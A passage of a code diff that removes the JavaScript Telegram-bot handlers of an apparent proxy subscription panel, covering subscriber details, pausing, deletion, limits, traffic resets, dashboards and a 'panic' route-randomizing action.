-
-            const statusEmoji = u.isPaused ? "⏸️" : isExp ? "🔴" : "🟢";
-            const statusText = u.isPaused
-                ? t("paused")
-                : isExp
-                  ? t("dash_expired")
-                  : t("active");
-            const subSync = `https://${hostName}/${sysConfig.apiRoute}?sub=${encodeURIComponent(u.name)}`;
-            const maxCfgTxt = u.maxConfigs || t("unlimited");
-            const notesTxt = u.notes || t("lbl_none");
-            const modeTxt = u.userMode
-                ? u.userMode === "alpha"
-                    ? "Alpha (V)"
-                    : u.userMode === "beta"
-                      ? "Beta (T)"
-                      : "Both"
-                : t("unlimited");
-            const portsTxt = u.userPorts || t("unlimited");
-            const cleanIpsTxt = u.cleanIp
-                ? u.cleanIp.substring(0, 30) +
-                  (u.cleanIp.length > 30 ? "..." : "")
-                : "—";
-            const proxyIpsTxt = u.proxyIp
-                ? u.proxyIp.substring(0, 30) +
-                  (u.proxyIp.length > 30 ? "..." : "")
-                : "—";
-            const nodesTxt = u.userNodes
-                ? u.userNodes.substring(0, 30) +
-                  (u.userNodes.length > 30 ? "..." : "")
-                : "—";
-            const nat64Txt = u.nat64 || "—";
-
-            let text = `👤 **${t("sub_info")}**\n`;
-            text += `━━━━━━━━━━━━━━━━\n`;
-            text += `📛 **${t("name")}**: ${u.name}\n`;
-            text += `🆔 **UUID**: \`${u.id}\`\n`;
-            text += `🚦 **${t("lbl_status")}**: ${statusEmoji} ${statusText}\n`;
-            text += `📊 **${t("total")}**: ${usedGB} GB / ${limitGB} GB (${userReqs} reqs)\n`;
-            text += `⏱ **${t("daily")}**: ${userDReqs} / ${limitDailyTxt}\n`;
-            text += `📅 **${t("expiry")}**: ${expTxt}\n`;
-            text += `⏳ **${t("days")}**: ${daysLeft}\n`;
-            text += `📡 **${t("tg_u_mode")}**: ${modeTxt}\n`;
-            text += `🔌 **${t("tg_u_ports")}**: ${portsTxt}\n`;
-            text += `📱 **${t("device_limit")}**: ${maxCfgTxt}\n`;
-            text += `🧹 **${t("tg_u_clean_ips")}**: ${cleanIpsTxt}\n`;
-            text += `🔗 **${t("tg_u_proxy_ips")}**: ${proxyIpsTxt}\n`;
-            text += `🖥️ **${t("tg_u_nodes")}**: ${nodesTxt}\n`;
-            text += `🌐 **${t("tg_u_nat64")}**: ${nat64Txt}\n`;
-            text += `🔗 **${t("tg_u_conn_limit")}**: ${u.connLimit || t("unlimited")}\n`;
-            text += `🎛 **${t("tg_u_panel_url")}**: ${u.userPanelUrl || t("unlimited")}\n`;
-            text += `📝 **${t("notes")}**: ${notesTxt}\n`;
-            text += `━━━━━━━━━━━━━━━━\n`;
-            text += `🔗 **${t("lbl_subscription")}:**\n\`${subSync}\``;
-
-            const kb = {
-                inline_keyboard: [
-                    [
-                        {
-                            text: u.isPaused
-                                ? `▶️ ${t("btn_resume")}`
-                                : `⏸️ ${t("btn_pause")}`,
-                            callback_data: `sub_toggle:${u.id}`,
-                        },
-                        {
-                            text: `🗑️ ${t("btn_del")}`,
-                            callback_data: `sub_del_init:${u.id}`,
-                        },
-                    ],
-                    [
-                        {
-                            text: `✏️ ${t("btn_edit_name")}`,
-                            callback_data: `sub_edit_name_init:${u.id}`,
-                        },
-                        {
-                            text: `⚙️ ${t("btn_edit_limits")}`,
-                            callback_data: `sub_edit_limits_init:${u.id}`,
-                        },
-                    ],
-                    [
-                        {
-                            text: `🔄 ${t("reset_traffic")}`,
-                            callback_data: `sub_reset_traffic:${u.id}`,
-                        },
-                        {
-                            text: `📅 ${t("extend_expiry")}`,
-                            callback_data: `sub_extend_init:${u.id}`,
-                        },
-                    ],
-                    [
-                        {
-                            text: `📝 ${t("notes")}`,
-                            callback_data: `sub_edit_notes_init:${u.id}`,
-                        },
-                        {
-                            text: `📱 ${t("device_limit")}`,
-                            callback_data: `sub_edit_device_init:${u.id}`,
-                        },
-                    ],
-                    [
-                        {
-                            text: t("btn_back_to_list"),
-                            callback_data: "subs_list:0",
-                        },
-                    ],
-                ],
-            };
-            return { text, kb };
-        };
-
-        if (update.callback_query) {
-            const cb = update.callback_query;
-            const chatId = cb.message?.chat?.id;
-            const messageId = cb.message?.message_id;
-            const data = cb.data;
-
-            if (chatId) {
-                if (!isAuthorized) {
-                    await fetchT(`${tgApi}/answerCallbackQuery`, {
-                        method: "POST",
-                        headers: { "Content-Type": "application/json" },
-                        body: JSON.stringify({
-                            callback_query_id: cb.id,
-                            text: t("access_denied"),
-                            show_alert: true,
-                        }),
-                    });
-                    return new Response("OK", { status: 200 });
-                }
-
-                // Get active panel from last login signal
-                const activePanel = getActivePanel();
-                const isRemotePanel = activePanel && !activePanel.isLocal;
-
-                // Helper to fetch users for the active panel
-                const getPanelUsers = async () => {
-                    if (isRemotePanel) {
-                        const res = await fetchRemotePanelUsers(activePanel);
-                        return res.success ? res.users || [] : null;
-                    }
-                    return sysConfig.users || [];
-                };
-
-                // Clear step state on callback query
-                tgState[chatId] = null;
-                ctx?.waitUntil(
-                    d1Put(env, "tg_bot_state", JSON.stringify(tgState)).catch(
-                        () => {},
-                    ),
-                );
-
-                let answerText = null;
-
-                if (data === "main_menu") {
-                    const menu = getMainMenu(activePanel, isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "sys_lang") {
-                    sysConfig.tgBotLang = langCode === "fa" ? "en" : "fa";
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    const menu = getMainMenu(activePanel, isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "sys_toggle_status") {
-                    sysConfig.isPaused = !sysConfig.isPaused;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    const menu = getMainMenu(activePanel, isAuthorized);
-                    await sendOrEdit(chatId, menu.text, menu.kb, messageId);
-                } else if (data === "sys_metrics") {
-                    let usageStr = t("unlimited");
-                    if (sysConfig.cfAccountId && sysConfig.cfApiToken) {
-                        const reqs = await fetchCloudflareUsage(
-                            sysConfig.cfAccountId,
-                            sysConfig.cfApiToken,
-                        );
-                        if (reqs !== null) {
-                            const pct = ((reqs / 100000) * 100).toFixed(2);
-                            usageStr = `${reqs}/100000 (${pct}%)`;
-                        }
-                    }
-                    const upSeconds = Math.floor(
-                        (Date.now() - isolateStartTime) / 1000,
-                    );
-                    const dh = Math.floor(upSeconds / 3600);
-                    const dm = Math.floor((upSeconds % 3600) / 60);
-
-                    let text = `📡 **${t("metrics")}**\n`;
-                    text += `━━━━━━━━━━━━━━━━\n`;
-                    text += `⏱ **${t("uptime")}**: ${dh}h ${dm}m\n`;
-                    text += `🔌 **${t("streams")}**: ${activeConnections}\n`;
-                    text += `📊 **Cloudflare API Usage**: ${usageStr}\n`;
-                    text += `━━━━━━━━━━━━━━━━`;
-
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("subs_list:")) {
-                    const page = parseInt(data.replace("subs_list:", "")) || 0;
-                    const panelUsers = await getPanelUsers();
-                    if (panelUsers === null && isRemotePanel) {
-                        await sendOrEdit(chatId, t("msg_panel_error"), {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: t("btn_main_menu"),
-                                        callback_data: "main_menu",
-                                    },
-                                ],
-                            ],
-                        });
-                    } else {
-                        const list = getSubsList(page, panelUsers);
-                        await sendOrEdit(chatId, list.text, list.kb, messageId);
-                    }
-                } else if (data.startsWith("sub_detail:")) {
-                    const uuid = data.replace("sub_detail:", "");
-                    const panelUsers = await getPanelUsers();
-                    if (panelUsers === null && isRemotePanel) {
-                        await sendOrEdit(chatId, t("msg_panel_error"), {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: t("btn_main_menu"),
-                                        callback_data: "main_menu",
-                                    },
-                                ],
-                            ],
-                        });
-                    } else {
-                        const detail = getSubDetail(uuid, panelUsers);
-                        await sendOrEdit(
-                            chatId,
-                            detail.text,
-                            detail.kb,
-                            messageId,
-                        );
-                    }
-                } else if (data.startsWith("sub_toggle:")) {
-                    const uuid = data.replace("sub_toggle:", "");
-                    if (isRemotePanel) {
-                        await remotePanelToggleUser(activePanel, uuid);
-                    } else if (sysConfig.users) {
-                        const u = sysConfig.users.find(
-                            (usr) => usr.id === uuid,
-                        );
-                        if (u) {
-                            u.isPaused = !u.isPaused;
-                            await cachedD1Put(
-                                env,
-                                "sys_config",
-                                JSON.stringify(sysConfig),
-                            );
-                        }
-                    }
-                    const panelUsers = await getPanelUsers();
-                    const detail = getSubDetail(uuid, panelUsers);
-                    await sendOrEdit(chatId, detail.text, detail.kb, messageId);
-                } else if (data.startsWith("sub_del_init:")) {
-                    const uuid = data.replace("sub_del_init:", "");
-                    const panelUsers = await getPanelUsers();
-                    const u = panelUsers?.find((usr) => usr.id === uuid);
-                    const name = u ? u.name : "";
-                    const text = `${t("msg_confirm_del")}\n\n👤 **${name}**`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `✅ ${t("btn_confirm")}`,
-                                    callback_data: `sub_del_confirm:${uuid}`,
-                                },
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: `sub_detail:${uuid}`,
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_del_confirm:")) {
-                    const uuid = data.replace("sub_del_confirm:", "");
-                    if (isRemotePanel) {
-                        await remotePanelWriteAction(
-                            activePanel,
-                            "DELETE",
-                            uuid,
-                        );
-                    } else if (sysConfig.users) {
-                        sysConfig.users = sysConfig.users.filter(
-                            (usr) => usr.id !== uuid,
-                        );
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                    }
-                    const successText = `✅ ${t("msg_deleted")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: t("btn_back"),
-                                    callback_data: "subs_list:0",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, successText, kb, messageId);
-                } else if (data === "sub_add_init") {
-                    tgState[chatId] = { step: "sub_add_name" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `➕ ${t("msg_enter_name")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: "subs_list:0",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_edit_name_init:")) {
-                    const uuid = data.replace("sub_edit_name_init:", "");
-                    tgState[chatId] = { step: `sub_edit_name:${uuid}` };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `✏️ ${t("msg_enter_name")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: `sub_detail:${uuid}`,
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_edit_limits_init:")) {
-                    const uuid = data.replace("sub_edit_limits_init:", "");
-                    tgState[chatId] = { step: `sub_edit_limits:${uuid}` };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `⚙️ ${t("msg_enter_limits")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `♾️ Skip (Unlimited)`,
-                                    callback_data: `sub_unlimit_cb:${uuid}`,
-                                },
-                            ],
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: `sub_detail:${uuid}`,
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_unlimit_cb:")) {
-                    const uuid = data.replace("sub_unlimit_cb:", "");
-                    if (isRemotePanel) {
-                        await remotePanelWriteAction(activePanel, "PUT", uuid, {
-                            key: activePanel.apiKey,
-                            trafficLimit: 0,
-                            dailyLimit: 0,
-                            expiryDays: 0,
-                        });
-                    } else if (sysConfig.users) {
-                        const u = sysConfig.users.find(
-                            (usr) => usr.id === uuid,
-                        );
-                        if (u) {
-                            u.limitTotalReq = null;
-                            u.limitDailyReq = null;
-                            u.expiryMs = null;
-                            await cachedD1Put(
-                                env,
-                                "sys_config",
-                                JSON.stringify(sysConfig),
-                            );
-                        }
-                    }
-                    const panelUsers = await getPanelUsers();
-                    const detail = getSubDetail(uuid, panelUsers);
-                    await sendOrEdit(chatId, detail.text, detail.kb, messageId);
-                } else if (data === "sub_add_unlimited_skip") {
-                    let stateName = "Subscriber";
-                    try {
-                        const savedStateRaw = await d1Get(env, "tg_bot_state");
-                        if (savedStateRaw) {
-                            const stObj = JSON.parse(savedStateRaw);
-                            if (stObj[chatId] && stObj[chatId].name) {
-                                stateName = stObj[chatId].name;
-                            }
-                        }
-                    } catch (e) {}
-
-                    const newUuid = crypto.randomUUID();
-                    if (isRemotePanel) {
-                        const res = await remotePanelWriteAction(
-                            activePanel,
-                            "POST",
-                            null,
-                            { key: activePanel.apiKey, name: stateName },
-                        );
-                        if (res.success && res.user) {
-                            const detail = getSubDetail(res.user.id, [
-                                res.user,
-                            ]);
-                            await sendOrEdit(
-                                chatId,
-                                `✅ ${t("msg_added")}\n\n${detail.text}`,
-                                detail.kb,
-                                messageId,
-                            );
-                        } else {
-                            await sendOrEdit(chatId, t("msg_panel_error"), {
-                                inline_keyboard: [
-                                    [
-                                        {
-                                            text: t("btn_main_menu"),
-                                            callback_data: "main_menu",
-                                        },
-                                    ],
-                                ],
-                            });
-                        }
-                    } else {
-                        if (!sysConfig.users) sysConfig.users = [];
-                        sysConfig.users.push({
-                            id: newUuid,
-                            name: stateName,
-                            limitTotalReq: null,
-                            limitDailyReq: null,
-                            expiryMs: null,
-                            createdAt: Date.now(),
-                        });
-                        await cachedD1Put(
-                            env,
-                            "sys_config",
-                            JSON.stringify(sysConfig),
-                        );
-                        const detail = getSubDetail(newUuid);
-                        await sendOrEdit(
-                            chatId,
-                            `✅ ${t("msg_added")}\n\n${detail.text}`,
-                            detail.kb,
-                            messageId,
-                        );
-                    }
-                    tgState[chatId] = null;
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                } else if (data === "sys_panic_init") {
-                    const text = `${t("msg_confirm_panic")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `🚨 YES PANIC 🚨`,
-                                    callback_data: "sys_panic_confirm",
-                                },
-                                {
-                                    text: `❌ No, Cancel`,
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data === "sys_panic_confirm") {
-                    sysConfig.apiRoute = Array.from(
-                        crypto.getRandomValues(new Uint8Array(8)),
-                    )
-                        .map((b) => b.toString(16).padStart(2, "0"))
-                        .join("");
-                    sysConfig.isPaused = true;
-                    await cachedD1Put(
-                        env,
-                        "sys_config",
-                        JSON.stringify(sysConfig),
-                    );
-                    const successText = `${t("msg_panic")}\n\n🔑 New Secret Path Randomized. All old sessions revoked.`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, successText, kb, messageId);
-                } else if (data === "sys_dashboard") {
-                    let users,
-                        activeCount,
-                        pausedCount,
-                        expiredCount,
-                        autoDisabledCount;
-                    if (isRemotePanel) {
-                        const statsRes =
-                            await fetchRemotePanelStats(activePanel);
-                        if (statsRes.success && statsRes.stats) {
-                            const s = statsRes.stats;
-                            users = [];
-                            activeCount = s.users?.active || 0;
-                            pausedCount = s.users?.paused || 0;
-                            expiredCount = s.users?.expired || 0;
-                            autoDisabledCount = s.users?.autoDisabled || 0;
-                        } else {
-                            const panelUsers = await getPanelUsers();
-                            users = panelUsers || [];
-                            activeCount = users.filter(
-                                (u) =>
-                                    !u.isPaused &&
-                                    (!u.expiryMs || Date.now() <= u.expiryMs),
-                            ).length;
-                            pausedCount = users.filter(
-                                (u) => u.isPaused && !u.disabledReason,
-                            ).length;
-                            expiredCount = users.filter(
-                                (u) =>
-                                    u.expiryMs &&
-                                    Date.now() > u.expiryMs &&
-                                    !u.isPaused,
-                            ).length;
-                            autoDisabledCount = users.filter(
-                                (u) => u.isPaused && u.disabledReason,
-                            ).length;
-                        }
-                    } else {
-                        users = sysConfig.users || [];
-                        activeCount = users.filter(
-                            (u) =>
-                                !u.isPaused &&
-                                (!u.expiryMs || Date.now() <= u.expiryMs),
-                        ).length;
-                        pausedCount = users.filter(
-                            (u) => u.isPaused && !u.disabledReason,
-                        ).length;
-                        expiredCount = users.filter(
-                            (u) =>
-                                u.expiryMs &&
-                                Date.now() > u.expiryMs &&
-                                !u.isPaused,
-                        ).length;
-                        autoDisabledCount = users.filter(
-                            (u) => u.isPaused && u.disabledReason,
-                        ).length;
-                    }
-                    let dashText = `📊 **${t("dashboard")}**\n`;
-                    dashText += `━━━━━━━━━━━━━━━━\n`;
-                    dashText += `📌 **${t("current_panel")}**: ${activePanel.isLocal ? "🏠" : "🌐"} ${activePanel.name}\n`;
-                    dashText += `━━━━━━━━━━━━━━━━\n`;
-                    dashText += `👥 **${t("dash_total")}**: ${Array.isArray(users) ? users.length : activeCount + pausedCount + expiredCount + autoDisabledCount}\n`;
-                    dashText += `🟢 **${t("dash_active")}**: ${activeCount}\n`;
-                    dashText += `⏸️ **${t("dash_paused")}**: ${pausedCount}\n`;
-                    dashText += `🔴 **${t("dash_expired")}**: ${expiredCount}\n`;
-                    dashText += `🚫 **${t("dash_auto_disabled")}**: ${autoDisabledCount}\n`;
-                    if (!isRemotePanel) {
-                        const upSeconds = Math.floor(
-                            (Date.now() - isolateStartTime) / 1000,
-                        );
-                        const dh = Math.floor(upSeconds / 3600);
-                        const dm = Math.floor((upSeconds % 3600) / 60);
-                        dashText += `⏱ **${t("uptime")}**: ${dh}h ${dm}m\n`;
-                        dashText += `🔌 **${t("streams")}**: ${activeConnections}\n`;
-                        dashText += `⚡ **System**: ${sysConfig.isPaused ? t("paused") : t("active")}\n`;
-                    }
-                    dashText += `━━━━━━━━━━━━━━━━`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, dashText, kb, messageId);
-                } else if (data === "sys_stats") {
-                    let users, totalReqs, dailyReqs;
-                    let totalBytesSum = 0,
-                        dailyBytesSum = 0;
-                    if (isRemotePanel) {
-                        const statsRes =
-                            await fetchRemotePanelStats(activePanel);
-                        if (statsRes.success && statsRes.stats) {
-                            const s = statsRes.stats;
-                            users = [];
-                            totalReqs = s.traffic?.totalRequests || 0;
-                            dailyReqs = s.traffic?.dailyRequests || 0;
-                        } else {
-                            const panelUsers = await getPanelUsers();
-                            users = panelUsers || [];
-                            totalReqs = 0;
-                            dailyReqs = 0;
-                        }
-                    } else {
-                        users = sysConfig.users || [];
-                        totalReqs = 0;
-                        dailyReqs = 0;
-                        const todayDate = new Date()
-                            .toISOString()
-                            .split("T")[0];
-                        users.forEach((u) => {
-                            const idClean = u.id
-                                .replace(/-/g, "")
-                                .toLowerCase();
-                            const sysU = sysUsageCache?.users?.[idClean] || {
-                                reqs: 0,
-                                dReqs: 0,
-                                lastDay: "",
-                            };
-                            totalReqs += sysU.reqs || 0;
-                            if (sysU.lastDay === todayDate)
-                                dailyReqs += sysU.dReqs || 0;
-                            totalBytesSum += usageTotalBytes(sysU);
-                            dailyBytesSum += usageDailyBytes(sysU, todayDate);
-                        });
-                    }
-                    let statsText = `📈 **${t("stats_title")}**\n`;
-                    statsText += `━━━━━━━━━━━━━━━━\n`;
-                    statsText += `📌 **${t("current_panel")}**: ${activePanel.isLocal ? "🏠" : "🌐"} ${activePanel.name}\n`;
-                    statsText += `━━━━━━━━━━━━━━━━\n`;
-                    statsText += `👥 **${t("dash_total")}**: ${Array.isArray(users) ? users.length : "N/A"}\n`;
-                    statsText += `📊 **${t("total_traffic")}**: ${(totalBytesSum / 1073741824).toFixed(2)} GB\n`;
-                    statsText += `📅 **${t("daily_traffic")}**: ${(dailyBytesSum / 1073741824).toFixed(2)} GB\n`;
-                    if (!isRemotePanel) {
-                        const upSeconds = Math.floor(
-                            (Date.now() - isolateStartTime) / 1000,
-                        );
-                        const dh = Math.floor(upSeconds / 3600);
-                        const dm = Math.floor((upSeconds % 3600) / 60);
-                        statsText += `⏱ **${t("tg_uptime")}**: ${dh}h ${dm}m\n`;
-                        statsText += `🔌 **${t("tg_conns")}**: ${activeConnections}\n`;
-                        statsText += `📦 **${t("tg_version")}**: v${CURRENT_VERSION}\n`;
-                    }
-                    statsText += `━━━━━━━━━━━━━━━━`;
-                    if (sysConfig.cfAccountId && sysConfig.cfApiToken) {
-                        const reqs = await fetchCloudflareUsage(
-                            sysConfig.cfAccountId,
-                            sysConfig.cfApiToken,
-                        );
-                        if (reqs !== null) {
-                            const pct = ((reqs / 100000) * 100).toFixed(2);
-                            statsText += `\n☁️ **Cloudflare API**: ${reqs}/100000 (${pct}%)`;
-                        }
-                    }
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `🔄 ${t("btn_update_usage")}`,
-                                    callback_data: "sys_stats",
-                                },
-                            ],
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, statsText, kb, messageId);
-                } else if (data === "sys_panel_info") {
-                    let infoText = `ℹ️ **${t("panel_info")}**\n`;
-                    infoText += `━━━━━━━━━━━━━━━━\n`;
-                    infoText += `📌 **${t("current_panel")}**: ${activePanel.isLocal ? "🏠" : "🌐"} ${activePanel.name}\n`;
-                    if (activePanel.isLocal) {
-                        infoText += `🌐 **Host**: ${hostName}\n`;
-                        infoText += `🔑 **API Route**: \`${sysConfig.apiRoute}\`\n`;
-                        infoText += `📡 **Mode**: ${sysConfig.mode || "alpha"}\n`;
-                        infoText += `🔒 **Ports**: ${sysConfig.socketPorts || "443"}\n`;
-                    } else {
-                        infoText += `🌐 **Host**: ${activePanel.host}\n`;
-                        infoText += `🔑 **API Route**: \`${activePanel.apiRoute}\`\n`;
-                    }
-                    infoText += `📱 **Version**: ${CURRENT_VERSION}\n`;
-                    infoText += `━━━━━━━━━━━━━━━━`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: t("btn_main_menu"),
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, infoText, kb, messageId);
-                } else if (data.startsWith("subs_disabled:")) {
-                    const panelUsers = await getPanelUsers();
-                    const users = panelUsers || [];
-                    const disabledUsers = users.filter((u) => u.isPaused);
-                    if (disabledUsers.length === 0) {
-                        const kb = {
-                            inline_keyboard: [
-                                [
-                                    {
-                                        text: t("btn_main_menu"),
-                                        callback_data: "main_menu",
-                                    },
-                                ],
-                            ],
-                        };
-                        await sendOrEdit(
-                            chatId,
-                            `🚫 ${t("msg_no_disabled")}`,
-                            kb,
-                            messageId,
-                        );
-                    } else {
-                        const page =
-                            parseInt(data.replace("subs_disabled:", "")) || 0;
-                        const itemsPerPage = 5;
-                        const start = page * itemsPerPage;
-                        const end = start + itemsPerPage;
-                        const pageUsers = disabledUsers.slice(start, end);
-                        let text = `🚫 **${t("disabled_users")}** (${disabledUsers.length})\n━━━━━━━━━━━━━━━━\n`;
-                        const inline_keyboard = [];
-                        pageUsers.forEach((u) => {
-                            const reason = u.disabledReason || t("paused");
-                            text += `👤 **${u.name}**\n   ${reason}\n`;
-                            inline_keyboard.push([
-                                {
-                                    text: `▶️ ${u.name}`,
-                                    callback_data: `sub_toggle:${u.id}`,
-                                },
-                            ]);
-                        });
-                        const navRow = [];
-                        if (page > 0)
-                            navRow.push({
-                                text: `⬅️ ${t("btn_back")}`,
-                                callback_data: `subs_disabled:${page - 1}`,
-                            });
-                        if (end < disabledUsers.length)
-                            navRow.push({
-                                text: `${t("btn_next")} ➡️`,
-                                callback_data: `subs_disabled:${page + 1}`,
-                            });
-                        if (navRow.length > 0) inline_keyboard.push(navRow);
-                        inline_keyboard.push([
-                            {
-                                text: t("btn_main_menu"),
-                                callback_data: "main_menu",
-                            },
-                        ]);
-                        await sendOrEdit(
-                            chatId,
-                            text,
-                            { inline_keyboard },
-                            messageId,
-                        );
-                    }
-                } else if (data === "sub_search_init") {
-                    tgState[chatId] = { step: "sub_search" };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `🔍 ${t("msg_enter_search")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: "main_menu",
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_reset_traffic:")) {
-                    const uuid = data.replace("sub_reset_traffic:", "");
-                    if (isRemotePanel) {
-                        await remotePanelResetTraffic(activePanel, uuid);
-                    } else {
-                        if (!sysUsageCache) sysUsageCache = { users: {} };
-                        if (!sysUsageCache.users) sysUsageCache.users = {};
-                        const uuidClean = uuid.replace(/-/g, "").toLowerCase();
-            if (sysUsageCache.users[uuidClean]) {
-                sysUsageCache.users[uuidClean].reqs = 0;
-                sysUsageCache.users[uuidClean].dReqs = 0;
-                sysUsageCache.users[uuidClean].bytes = 0;
-                sysUsageCache.users[uuidClean].dBytes = 0;
-            } else {
-                sysUsageCache.users[uuidClean] = {
-                    reqs: 0,
-                    dReqs: 0,
-                    bytes: 0,
-                    dBytes: 0,
-                    lastDay: new Date().toISOString().split("T")[0],
-                };
-            }
-                        await cachedD1Put(
-                            env,
-                            "sys_usage",
-                            JSON.stringify(sysUsageCache),
-                        );
-                    }
-                    const panelUsers = await getPanelUsers();
-                    const detail = getSubDetail(uuid, panelUsers);
-                    await sendOrEdit(
-                        chatId,
-                        `✅ ${t("msg_traffic_reset")}\n\n${detail.text}`,
-                        detail.kb,
-                        messageId,
-                    );
-                } else if (data.startsWith("sub_extend_init:")) {
-                    const uuid = data.replace("sub_extend_init:", "");
-                    tgState[chatId] = { step: `sub_extend_days:${uuid}` };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `📅 ${t("msg_enter_extend_days")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: `sub_detail:${uuid}`,
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_edit_notes_init:")) {
-                    const uuid = data.replace("sub_edit_notes_init:", "");
-                    tgState[chatId] = { step: `sub_edit_notes:${uuid}` };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `📝 ${t("msg_enter_notes")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: `sub_detail:${uuid}`,
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_edit_device_init:")) {
-                    const uuid = data.replace("sub_edit_device_init:", "");
-                    tgState[chatId] = { step: `sub_edit_device:${uuid}` };
-                    ctx?.waitUntil(
-                        d1Put(
-                            env,
-                            "tg_bot_state",
-                            JSON.stringify(tgState),
-                        ).catch(() => {}),
-                    );
-                    const text = `📱 ${t("msg_enter_device_limit")}`;
-                    const kb = {
-                        inline_keyboard: [
-                            [
-                                {
-                                    text: `♾️ Unlimited`,
-                                    callback_data: `sub_device_unlimited:${uuid}`,
-                                },
-                            ],
-                            [
-                                {
-                                    text: `❌ ${t("btn_cancel")}`,
-                                    callback_data: `sub_detail:${uuid}`,
-                                },
-                            ],
-                        ],
-                    };
-                    await sendOrEdit(chatId, text, kb, messageId);
-                } else if (data.startsWith("sub_device_unlimited:")) {
-                    const uuid = data.replace("sub_device_unlimited:", "");
-                    if (isRemotePanel) {
-                        await remotePanelWriteAction(activePanel, "PUT", uuid, {
-                            key: activePanel.apiKey,
-                            maxConfigs: null,
-                        });
-                    } else if (sysConfig.users) {
-                        const u = sysConfig.users.find(
-                            (usr) => usr.id === uuid,
-                        );
-                        if (u) {
-                            u.maxConfigs = null;
-                            await cachedD1Put(
-                                env,
-                                "sys_config",
-                                JSON.stringify(sysConfig),
-                            );
-                        }
-                    }
-                    const panelUsers = await getPanelUsers();
-                    const detail = getSubDetail(uuid, panelUsers);
-                    await sendOrEdit(
-                        chatId,
-                        `✅ ${t("status_updated")}`,
-                        detail.kb,
-                        messageId,
-                    );
-                } else if (data === "get_sub_link") {
-                    const subUrl = `https://${hostName}/${sysConfig.apiRoute}`;
